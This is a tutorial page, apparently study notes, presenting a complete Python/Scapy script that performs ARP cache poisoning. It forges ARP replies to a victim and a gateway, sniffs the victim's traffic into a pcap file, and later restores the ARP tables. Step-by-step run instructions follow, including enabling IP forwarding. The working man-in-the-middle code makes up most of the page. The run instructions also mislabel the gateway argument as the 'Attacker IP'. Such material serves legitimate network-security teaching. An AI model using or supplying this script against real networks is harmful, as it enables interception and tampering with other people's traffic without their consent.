# **ARP Cache Poisoning with Scapy**

ARP cache poisoning is an attack where an attacker sends forged ARP messages to the victim's computer, tricking it into thinking that the attacker's computer is the gateway. This allows the attacker to intercept and manipulate network traffic between the two hosts. Scapy can be used to perform ARP cache poisoning attacks by sending forged ARP messages to the victim's computer.

### `arper.py`

```python
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

""""
helper function to get the MAC address for any given machine
"""
# pass in the target IP address and create a packet
def get_mac(targetip):

    # Ether -> specifies -> packet is to be boradcast
    # ARP -> specifies -> the request for the MAC address
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)

    # send the packet with the Scapy function srp
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)

    for _, r in resp:
        return r[Ether].src
    return None

class Arper:

    """
    initialize the class with the victim and gateway IPs and specify the interface to use
    """
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    """"
    The run method performs the main work of the Arper object
    """
    def run(self):
        # poison the ARP cache
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # watch the attack in progress by sniffing the network traffic
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    """"
    The poison method creates the poisoned packets and sends them to the victim and the gateway
    """
    def poison(self):
        
        # creating a poisoned ARP packet intended for the victim
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)

        # create a poisoned ARP packet for the gateway
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')

        """
        start sending the poisoned packets to their destinations in an infinite loop to make sure that the respective ARP cache entries remain poisoned for the duration of the attack
        """
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            
            # The loop will continue until you press CTRL-C (KeyboardInterrupt)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    """"
    In order to see and record the attack as it happens, we sniff the network traffic with the sniff method
    """
    def sniff(self, count=200):
        # sniff method sleeps for n seconds
        time.sleep(5)
        print(f'Sniffing {count} packets')

        # filtering for packets that have the victim’s IP
        bpf_filter = "ip host %s" % victim

        # sniffs for a number of packets
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)

        # Once we’ve captured the packets, we write them to a file called "arper.pcap"
        wrpcap('arper.pcap', packets)
        print('Got the packets')

        # restore the ARP tables to their original values; terminate the poisoning thread
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    """"
    the restore method puts the victim and gateway machines back to their original state by sending correct ARP information to each machine:
    """
    def restore(self):
        print('Restoring ARP tables...')
        
        # sends the original values for the gateway IP and MAC addresses to the victim
        send(ARP(
        op=2,
        psrc=self.gateway,
        hwsrc=self.gatewaymac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)

        # sends the original values for the victim’s IP and MAC to the gateway
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)      

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
```

1. The code defines a class called `Arper`.
2. The `Arper` class is initialized with the IP addresses of the victim and the gateway, as well as the network interface to use.
3. The `run()` method of the `Arper` class is called to start the ARP cache poisoning attack.
4. The `poison()` method of the `Arper` class is called to create two ARP packets, one for the victim and one for the gateway, and send them to their respective targets.
5. The `sniff()` method of the `Arper` class is used to capture network traffic that flows between the victim and the gateway.
6. The packets that are captured by the `sniff()` method are saved to a file called "arper.pcap".
7. The `restore()` method of the `Arper` class is called to put the victim and gateway computers back to their original state by sending correct ARP information to each machine.
8. To use this code, the user must provide the IP addresses of the victim and the gateway, as well as the network interface to use, as command-line arguments.

The ARP cache poisoning attack works as follows:

1. The attacker sends forged ARP messages to the victim's computer, tricking it into thinking that the attacker's computer is the gateway.
2. This allows the attacker to intercept and manipulate network traffic between the victim and the gateway.
3. The `poison()` method creates two ARP packets with fake information that causes the victim's computer to think that the attacker's computer is the gateway, and the gateway's computer to think that the attacker's computer is the victim.
4. After the ARP cache is poisoned, the `sniff()` method captures network traffic that flows between the victim and the gateway.
5. The captured packets are saved to a file called `"arper.pcap"`.
6. The `restore()` method puts the victim and gateway computers back to their original state by sending correct ARP information to each machine.

Overall, this code demonstrates how Scapy can be used to perform an ARP cache poisoning attack and capture network traffic.

### How to run the code:

1. run the following command on your attacher machine (Kali VM) with root permission:
    
    ```bash
    #:> echo 1 > /proc/sys/net/ipv4/ip_forward
    ```
    
    In apple machine:
    
    ```bash
    #:> sudo sysctl -w net.inet.ip.forwarding=1
    ```
    
2. execute the python script with root terminal:
    
    ```bash
    #:> python arper.py <Target IP> <Attacker IP> <Attacker internet interface>
    
    E.G: #:> python arper.py 192.168.1.193 192.168.1.254 en0
    ```
    
3. Use CTRL-C to terminate poisoning when you are done.